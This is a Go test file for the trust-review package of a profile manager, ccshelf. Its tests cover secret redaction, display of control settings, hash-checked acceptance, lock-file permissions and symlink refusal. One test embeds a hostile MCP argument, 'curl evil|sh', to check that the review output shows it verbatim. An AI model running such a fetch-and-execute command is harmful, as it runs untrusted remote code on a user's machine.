package trust

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"unicode/utf8"

	"github.com/yorch/ccshelf/internal/profile"
)

const envTOML = `name = "envp"
description = "d"
account = "work"
[plugins]
exclude = ["old@acme"]
[session]
inherit_user_settings = true
[session.env]
CCSHELF_VAR_MODE = "strict"
PD_TOKEN_REF = "vault/pd"
CCSHELF_VAR_API_KEY = "hunter2"
`

func describeOf(v Verdict) string {
	var b bytes.Buffer
	v.Describe(&b)
	return b.String()
}

func flat(s string) string { return strings.Join(strings.Fields(s), " ") }

func TestControlsAreShownAndStored(t *testing.T) {
	org := orgTree(t)
	put(t, org, "profiles/envp.toml", envTOML)
	s := newStore(t)
	r := resolve(t, "envp", gitLike(org, "v1", sha1))
	v := s.Check(r)
	if v.State != New || v.Hash != r.Closure.Hash {
		t.Fatalf("verdict %+v", v)
	}
	out := describeOf(v)
	for _, want := range []string{
		"profile envp controls added (sets environment variables)",
		"environment variable CCSHELF_VAR_MODE=strict added",
		"environment variable PD_TOKEN_REF added",
		"environment variable CCSHELF_VAR_API_KEY=<redacted> added",
		"account: work", "inherit_user_settings: true", "plugins.exclude: old@acme added",
	} {
		if !strings.Contains(flat(out), want) {
			t.Errorf("lacks %q:\n%s", want, out)
		}
	}
	for _, bad := range []string{"vault/pd", "hunter2"} {
		if strings.Contains(out, bad) {
			t.Errorf("leaked %q:\n%s", bad, out)
		}
	}
	if err := accept(s, r); err != nil {
		t.Fatal(err)
	}
	e := s.List()[0]
	if e.Controls["envp"] == "" || profile.DigestBytes([]byte(e.Controls["envp"])) == "" {
		t.Fatalf("controls not stored: %+v", e.Controls)
	}
	// reopen from disk: still stored and valid
	s2, err := Open(s.Path())
	if err != nil || s2.List()[0].Controls["envp"] != e.Controls["envp"] {
		t.Fatalf("reload: %v", err)
	}
	// change controls: explained field by field
	put(t, org, "profiles/envp.toml", strings.NewReplacer(
		"account = \"work\"", "account = \"home\"", "inherit_user_settings = true\n", "",
		"CCSHELF_VAR_MODE = \"strict\"", "CCSHELF_VAR_MODE = \"lax\"", "CCSHELF_VAR_API_KEY = \"hunter2\"", "CCSHELF_VAR_API_KEY = \"other\"",
		"PD_TOKEN_REF = \"vault/pd\"", "CCSHELF_VAR_NEW_ONE = \"1\"").Replace(envTOML))
	v = s.Check(resolve(t, "envp", gitLike(org, "v1", sha1)))
	if v.State != Changed || !v.Risky {
		t.Fatalf("verdict %+v", v)
	}
	out = describeOf(v)
	for _, want := range []string{
		"profile envp controls changed (sets environment variables)",
		"account: work -> home", "inherit_user_settings: true -> unset",
		"environment variable CCSHELF_VAR_MODE changed (was strict, now lax)",
		"environment variable CCSHELF_VAR_API_KEY changed (the value changed and is not shown)",
		"environment variable CCSHELF_VAR_NEW_ONE=1 added", "environment variable PD_TOKEN_REF removed",
	} {
		if !strings.Contains(flat(out), want) {
			t.Errorf("lacks %q:\n%s", want, out)
		}
	}
	if strings.Contains(out, "hunter2") || strings.Contains(out, "other") {
		t.Errorf("secret-named values leaked:\n%s", out)
	}
}

func TestControlsFromOldLockfileSayUnknown(t *testing.T) {
	org := orgTree(t)
	put(t, org, "profiles/envp.toml", envTOML)
	s := newStore(t)
	r := resolve(t, "envp", gitLike(org, "v1", sha1))
	if err := accept(s, r); err != nil {
		t.Fatal(err)
	}
	s.entries[0].Controls = nil
	put(t, org, "profiles/envp.toml", envTOML+"\n")
	put(t, org, "profiles/envp.toml", strings.Replace(envTOML, `"work"`, `"home"`, 1))
	out := describeOf(s.Check(resolve(t, "envp", gitLike(org, "v1", sha1))))
	if !strings.Contains(flat(out), "the earlier version of these settings was not recorded") {
		t.Errorf("%s", out)
	}
}

func TestStoredControlsMustMatchItems(t *testing.T) {
	org := orgTree(t)
	put(t, org, "profiles/envp.toml", envTOML)
	s := newStore(t)
	if err := accept(s, resolve(t, "envp", gitLike(org, "v1", sha1))); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(s.Path())
	var lf map[string]any
	if err := json.Unmarshal(b, &lf); err != nil {
		t.Fatal(err)
	}
	ent := lf["entries"].([]any)[0].(map[string]any)
	ent["controls"] = map[string]any{"envp": `{"session.env":{}}`}
	nb, _ := json.Marshal(lf)
	if err := os.WriteFile(s.Path(), nb, 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Open(s.Path()); !errors.Is(err, ErrInconsistentClosure) {
		t.Errorf("Open = %v", err)
	}
}

func TestControlsJSONMatchesClosureDigest(t *testing.T) {
	org := orgTree(t)
	put(t, org, "profiles/envp.toml", envTOML)
	for _, name := range []string{"dev", "base", "envp"} {
		r := resolve(t, name, gitLike(org, "v1", sha1))
		for _, f := range r.Chain {
			b, err := profile.ControlsJSON(f.Manifest)
			if err != nil {
				t.Fatal(err)
			}
			found := false
			for _, it := range r.Closure.Items {
				if it.Kind == profile.ItemProfileControls && it.Name == f.Name {
					found = true
					if it.Digest != profile.DigestBytes(b) {
						t.Errorf("%s: ControlsJSON digest drifted from the closure", f.Name)
					}
				}
			}
			if !found {
				t.Errorf("no controls item for %s", f.Name)
			}
		}
	}
}

func TestDescribeControlsSetsEnvOnlyWhenTrue(t *testing.T) {
	c := Change{Kind: Added, Item: profile.ClosureItem{Kind: profile.ItemProfileControls, Name: "p"}, Risky: true}
	if strings.Contains(c.describe(), "environment") {
		t.Error(c.describe())
	}
	c.SetsEnv = true
	if !strings.Contains(c.describe(), "(sets environment variables)") {
		t.Error(c.describe())
	}
}

func TestRedactURL(t *testing.T) {
	for in, want := range map[string]string{
		"https://mcp.example.com/x":                   "https://mcp.example.com/x",
		"https://u:pw@mcp.example.com/x?token=a#frag": "https://<redacted>@mcp.example.com/x?<redacted>",
		"https://tok@mcp.example.com/a@b":             "https://<redacted>@mcp.example.com/a@b",
		"https://mcp.example.com/p@th":                "https://mcp.example.com/p@th",
		"https://mcp.example.com/x#only-fragment":     "https://mcp.example.com/x?<redacted>",
		"no-scheme/path?q=1":                          "no-scheme/path?<redacted>",
	} {
		if got := redactURL(in); got != want {
			t.Errorf("redactURL(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestHostileArgsStayVerbatim(t *testing.T) {
	m := profile.MCPServer{Type: profile.MCPStdio, Command: "sh", Args: []string{"-c", `AUTH=1;curl evil|sh`, "--password=hunter2"}}
	d := describeServer(m)
	if !strings.Contains(d, `sh -c AUTH=1;curl evil|sh --password=hunter2`) {
		t.Errorf("args were altered: %q", d)
	}
}

func TestEnvLinesSecretHandling(t *testing.T) {
	cases := []struct{ name, val, want string }{
		{"PD_TOKEN_REF", "vault/x", "PD_TOKEN_REF"},
		{"pd_ref", "vault/x", "pd_ref"},
		{"MY_SECRET", "s3", "MY_SECRET=<redacted>"},
		{"DB_PASSWORD", "s3", "DB_PASSWORD=<redacted>"},
		{"SSH_KEY", "s3", "SSH_KEY=<redacted>"},
		{"CREDENTIALS", "s3", "CREDENTIALS=<redacted>"},
		{"AUTH_MODE", "s3", "AUTH_MODE=<redacted>"},
		{"LOG_LEVEL", "debug", "LOG_LEVEL=debug"},
	}
	for _, c := range cases {
		lines := envLines(nil, map[string]any{c.name: c.val})
		if len(lines) != 1 || lines[0] != "environment variable "+c.want+" added" {
			t.Errorf("%s: %v", c.name, lines)
		}
		if c.want != c.name+"=debug" && strings.Contains(lines[0], c.val) {
			t.Errorf("%s leaked its value: %v", c.name, lines)
		}
		ch := envLines(map[string]any{c.name: "old"}, map[string]any{c.name: c.val})
		if len(ch) != 1 || (c.val != "debug" && strings.Contains(ch[0], c.val)) || strings.Contains(ch[0], "vault") {
			t.Errorf("%s change: %v", c.name, ch)
		}
	}
}

func TestCleanNeverHidesOrKeepsDangerousRunes(t *testing.T) {
	for name, r := range map[string]string{
		"ESC": "\x1b", "CR": "\r", "BS": "\b", "NUL": "\x00", "NL": "\n", "TAB": "\t", "C1 CSI": "\u009b",
		"RLO": "\u202e", "ZWSP": "\u200b", "LS": "\u2028", "BOM": "\ufeff", "invalid": "\xff",
	} {
		got := clean("a" + r + "b")
		if got == "a"+r+"b" || strings.ContainsAny(got, "\x1b\r\b\x00\n\t\u009b\u202e\u200b\u2028\ufeff") || !utf8.ValidString(got) {
			t.Errorf("%s survived: %q", name, got)
		}
		if !strings.HasPrefix(got, "a") || !strings.HasSuffix(got, "b") || utf8.RuneCountInString(got) != 3 {
			t.Errorf("%s: %q should keep its neighbors and replace one rune", name, got)
		}
	}
	long := strings.Repeat("x", 5000)
	if clean(long) != long {
		t.Error("clean truncated")
	}
}

func TestWrapTextKeepsEverything(t *testing.T) {
	for _, s := range []string{"", "short", strings.Repeat("word ", 80), strings.Repeat("x", 450), "añ" + strings.Repeat("é", 230) + " tail", strings.Repeat("a b", 100)} {
		lines := wrapText(s, 40)
		for _, l := range lines {
			if utf8.RuneCountInString(l) > 40 {
				t.Errorf("line too long (%d): %q", utf8.RuneCountInString(l), l)
			}
		}
		if got, want := strings.Join(lines, ""), strings.ReplaceAll(s, " ", ""); strings.ReplaceAll(got, " ", "") != want {
			t.Errorf("wrap lost characters for %q", s)
		}
	}
}

func TestDescribeWrapsRiskyDetailInsteadOfTruncating(t *testing.T) {
	args := []string{}
	for i := 0; i < 80; i++ {
		args = append(args, "arg"+strings.Repeat("z", i%7))
	}
	args = append(args, "--final-hidden-arg")
	c := Change{
		Kind: Added, Item: profile.ClosureItem{Kind: profile.ItemRegistry, Name: "x"}, Risky: true,
		Detail: describeServer(profile.MCPServer{Type: profile.MCPStdio, Command: "run", Args: args}),
	}
	out := describeOf(Verdict{State: New, Profile: "p", Changes: []Change{c}, Risky: true})
	if !strings.Contains(flat(out), "--final-hidden-arg") || strings.Contains(out, "...") {
		t.Errorf("risky detail was cut:\n%s", out)
	}
	for _, l := range strings.Split(out, "\n") {
		if utf8.RuneCountInString(l) > wrapWidth+8 {
			t.Errorf("unwrapped line: %q", l)
		}
	}
}

func TestAcceptNeedsTheReviewedHash(t *testing.T) {
	org := orgTree(t)
	s := newStore(t)
	r := resolve(t, "dev", gitLike(org, "v1", sha1))
	if err := s.Accept(r, ""); !errors.Is(err, ErrHashRequired) {
		t.Errorf("empty hash: %v", err)
	}
	if err := s.Accept(r, strings.Repeat("a", 64)); !errors.Is(err, ErrHashMismatch) {
		t.Errorf("wrong hash: %v", err)
	}
	if len(s.List()) != 0 {
		t.Fatal("nothing may be stored on refusal")
	}
	v := s.Check(r)
	if v.Hash == "" || v.Hash != r.Closure.Hash {
		t.Fatalf("Verdict.Hash = %q", v.Hash)
	}
	// reviewed, then the content changes before accepting: refused
	put(t, org, "prompts/dev.md", "different\n")
	r2 := resolve(t, "dev", gitLike(org, "v1", sha1))
	if err := s.Accept(r2, v.Hash); !errors.Is(err, ErrHashMismatch) {
		t.Errorf("stale hash: %v", err)
	}
	if err := s.Accept(r2, s.Check(r2).Hash); err != nil {
		t.Fatal(err)
	}
	// personal-only closures also refuse an empty hash
	root := t.TempDir()
	put(t, root, "profiles/base.toml", baseTOML)
	pr := resolve(t, "base", profile.DirSource(profile.KindPersonal, filepath.Join(root, "profiles")))
	if err := s.Accept(pr, ""); !errors.Is(err, ErrHashRequired) {
		t.Errorf("personal: %v", err)
	}
	if v := s.Check(pr); v.Hash != pr.Closure.Hash {
		t.Errorf("personal verdict hash %q", v.Hash)
	}
}

func TestInconsistentClosureIsNotNeedsTrust(t *testing.T) {
	org := orgTree(t)
	s := newStore(t)
	r := resolve(t, "dev", gitLike(org, "v1", sha1))
	bad := *r
	bad.Closure.Hash = strings.Repeat("0", 64)
	v := s.Check(&bad)
	if v.Problem == "" || v.Hash != "" {
		t.Fatalf("%+v", v)
	}
	err := s.Require(&bad)
	if err == nil || IsNeedsTrust(err) || !errors.Is(err, ErrInconsistentClosure) {
		t.Errorf("Require = %v (must not be a needs-trust error)", err)
	}
}

func TestConcurrentStoresDoNotLoseUpdates(t *testing.T) {
	org := orgTree(t)
	path := filepath.Join(t.TempDir(), "cfg", "lock.json")
	names := []string{"base", "dev"}
	// two extra profiles
	for _, n := range []string{"p1", "p2", "p3", "p4", "p5", "p6"} {
		put(t, org, "profiles/"+n+".toml", "name = \""+n+"\"\ndescription = \"d\"\n")
		names = append(names, n)
	}
	stores := make([]*Store, len(names))
	for i := range stores {
		s, err := Open(path) // all opened before any write: stale in-memory copies
		if err != nil {
			t.Fatal(err)
		}
		stores[i] = s
	}
	var wg sync.WaitGroup
	for i, n := range names {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if err := accept(stores[i], resolve(t, n, gitLike(org, "v1", sha1))); err != nil {
				t.Error(err)
			}
		}()
	}
	wg.Wait()
	final, err := Open(path)
	if err != nil {
		t.Fatal(err)
	}
	if got := len(final.List()); got != len(names) {
		t.Fatalf("lost updates: %d of %d entries: %+v", got, len(names), final.List())
	}
}

func TestRevokeIsNotUndoneByAStaleStore(t *testing.T) {
	org := orgTree(t)
	path := filepath.Join(t.TempDir(), "cfg", "lock.json")
	a, _ := Open(path)
	if err := accept(a, resolve(t, "base", gitLike(org, "v1", sha1))); err != nil {
		t.Fatal(err)
	}
	stale, _ := Open(path) // sees "base"
	if err := a.Revoke("base", ""); err != nil {
		t.Fatal(err)
	}
	// the stale store accepts another profile: it must reload first, so
	// "base" stays revoked
	if err := accept(stale, resolve(t, "dev", gitLike(org, "v1", sha1))); err != nil {
		t.Fatal(err)
	}
	final, _ := Open(path)
	for _, e := range final.List() {
		if e.Profile == "base" {
			t.Errorf("revoked entry came back: %+v", e)
		}
	}
	if len(final.List()) != 1 {
		t.Errorf("entries: %+v", final.List())
	}
}

func TestLockFileIsPrivateAndReused(t *testing.T) {
	org := orgTree(t)
	s := newStore(t)
	for i := 0; i < 2; i++ {
		if err := accept(s, resolve(t, "dev", gitLike(org, "v1", sha1))); err != nil {
			t.Fatal(err)
		}
	}
	fi, err := os.Stat(s.Path() + ".lock")
	if err != nil || !fi.Mode().IsRegular() {
		t.Fatalf("lock file: %v", err)
	}
	if runtime.GOOS != "windows" && fi.Mode().Perm() != 0o600 {
		t.Errorf("lock mode %v", fi.Mode().Perm())
	}
}

func TestStateFilePermissionsAreChecked(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX permission bits")
	}
	org := orgTree(t)
	s := newStore(t)
	if err := accept(s, resolve(t, "dev", gitLike(org, "v1", sha1))); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(s.Path(), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := Open(s.Path()); err == nil || !strings.Contains(err.Error(), "chmod 600") {
		t.Errorf("0644 lockfile: %v", err)
	}
	if err := os.Chmod(s.Path(), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Open(s.Path()); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Dir(s.Path())
	if err := os.Chmod(dir, 0o777); err != nil {
		t.Fatal(err)
	}
	defer os.Chmod(dir, 0o700)
	if _, err := Open(s.Path()); err == nil || !strings.Contains(err.Error(), "writable by group or others") {
		t.Errorf("0777 directory: %v", err)
	}
	// the project trust file gets the same treatment
	pp := filepath.Join(t.TempDir(), "cfg", "p.json")
	ps, _ := OpenProjects(pp)
	root := t.TempDir()
	put(t, root, ".ccshelf/profiles/a.toml", baseTOML)
	if err := ps.Trust(root); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(pp, 0o666); err != nil {
		t.Fatal(err)
	}
	if _, err := OpenProjects(pp); err == nil {
		t.Error("0666 project trust file must be refused")
	}
}

func TestOpenNoFollowRefusesSymlink(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks need privileges on Windows")
	}
	d := t.TempDir()
	target := filepath.Join(d, "target")
	if err := os.WriteFile(target, []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(d, "link")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
	// directly, bypassing the Lstat pre-check of readStateFile: this is the
	// race path (the file is swapped for a symlink after the check)
	if f, err := openNoFollow(link, os.O_RDONLY, 0); err == nil {
		f.Close()
		t.Fatal("openNoFollow followed a symlink")
	}
	if f, err := openNoFollow(link, os.O_WRONLY|os.O_CREATE, 0o600); err == nil {
		f.Close()
		t.Fatal("openNoFollow(create) followed a symlink")
	}
}

func TestTagMovedInInheritedSource(t *testing.T) {
	orgA := orgTree(t) // supplies base
	orgB := t.TempDir()
	put(t, orgB, "profiles/top.toml", "name = \"top\"\ndescription = \"d\"\nextends = [\"base\"]\n")
	srcA := func(commit string) *shared {
		return &shared{Source: profile.DirSource(profile.KindOrg, filepath.Join(orgA, "profiles")), locator: "git:https://example.com/a.git", ref: "v1", commit: commit}
	}
	srcB := func(commit string) *shared {
		return &shared{Source: profile.DirSource(profile.KindOrg, filepath.Join(orgB, "profiles")), locator: "git:https://example.com/b.git", ref: "v9", commit: commit}
	}
	s := newStore(t)
	r := resolve(t, "top", srcB(sha1), srcA(sha1))
	if err := accept(s, r); err != nil {
		t.Fatal(err)
	}
	e := s.List()[0]
	if e.Source != "git:https://example.com/b.git" || len(e.Sources) != 2 {
		t.Fatalf("entry: %+v", e)
	}
	// the root-most source (A) moved its tag; the key source (B) did not
	v := s.Check(resolve(t, "top", srcB(sha1), srcA(sha2)))
	if v.State != TagMoved || v.MovedSource != "git:https://example.com/a.git" || v.Ref != "v1" || v.OldCommit != sha1 || v.NewCommit != sha2 {
		t.Fatalf("verdict %+v", v)
	}
	if !strings.Contains(describeOf(v), "https://example.com/a.git") {
		t.Error("describe must name the source")
	}
	// the most specific source moved
	v = s.Check(resolve(t, "top", srcB(sha2), srcA(sha1)))
	if v.State != TagMoved || v.MovedSource != "git:https://example.com/b.git" {
		t.Fatalf("verdict %+v", v)
	}
	// unchanged
	if v := s.Check(resolve(t, "top", srcB(sha1), srcA(sha1))); v.State != Trusted {
		t.Fatalf("verdict %+v", v)
	}
}

func TestProjectDirectoriesCountTowardTheLimit(t *testing.T) {
	root := t.TempDir()
	for i := 0; i <= maxProjectFiles; i++ {
		if err := os.MkdirAll(filepath.Join(root, ProjectFolder, "d", "x"+itoa(i)), 0o700); err != nil {
			t.Fatal(err)
		}
		if i > 50 {
			break
		}
	}
	// a smaller limit would be nicer; instead check the counter directly
	l := &projectLimits{dir: "d"}
	var err error
	for i := 0; i <= maxProjectFiles && err == nil; i++ {
		err = l.addEntry()
	}
	if err == nil || !strings.Contains(err.Error(), "too many files") {
		t.Errorf("addEntry never failed: %v", err)
	}
}

func itoa(i int) string {
	h := sha256.Sum256([]byte{byte(i), byte(i >> 8)})
	return hex.EncodeToString(h[:4])
}

func TestProjectNestedSymlinkAndSpecialRefused(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks need privileges on Windows")
	}
	root := t.TempDir()
	put(t, root, ".ccshelf/profiles/deep/a.toml", baseTOML)
	outside := t.TempDir()
	if err := os.Symlink(outside, filepath.Join(root, ProjectFolder, "profiles", "deep", "link")); err != nil {
		t.Fatal(err)
	}
	if _, err := HashProjectFolder(root); err == nil || !strings.Contains(err.Error(), "symlink") {
		t.Errorf("nested symlinked dir: %v", err)
	}
}

func TestProjectTreeDepthIsBounded(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("the descriptor walk is Unix only")
	}
	root := t.TempDir()
	p := filepath.Join(root, ProjectFolder)
	for i := 0; i < 70; i++ {
		p = filepath.Join(p, "d")
	}
	if err := os.MkdirAll(p, 0o700); err != nil {
		t.Skip("path too long here")
	}
	if _, err := HashProjectFolder(root); err == nil || !strings.Contains(err.Error(), "too deeply") {
		t.Errorf("deep tree: %v", err)
	}
}
